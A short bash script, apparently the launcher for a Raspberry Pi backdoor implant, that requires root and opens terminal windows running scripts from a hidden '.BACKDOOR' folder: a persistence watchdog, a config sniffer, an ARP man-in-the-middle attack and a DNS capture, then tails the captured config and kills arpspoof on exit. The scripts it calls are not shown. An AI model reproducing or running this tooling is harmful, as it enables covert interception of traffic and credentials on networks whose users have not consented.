#!/bin/bash

if [ `whoami` != 'root' ]
  then
    echo "PLEASE RUN WITH ROOT PRIV."
    exit
fi

sudo xterm -hold -e "sudo /home/pi/.BACKDOOR/PERSISTANCE/WATCHDOG.py" &
sleep 2
sudo xterm -hold -e "sudo /home/pi/.BACKDOOR/PERSISTANCE/CONFIG_SNIFFER.py" &
sleep 2
sudo xterm -hold -e "sudo /home/pi/.BACKDOOR/PERSISTANCE/ARP_MITM.py" &
sleep 2
sudo xterm -hold -e "sudo /home/pi/.BACKDOOR/GET_DNS.py" &
sudo xterm -hold -e "sudo tail -f /home/pi/.BACKDOOR/PERSISTANCE/CONFIG.txt" &
echo "PUSH TO STOP"
read

sudo killall python3
sudo killall xterm
sudo killall arpspoof
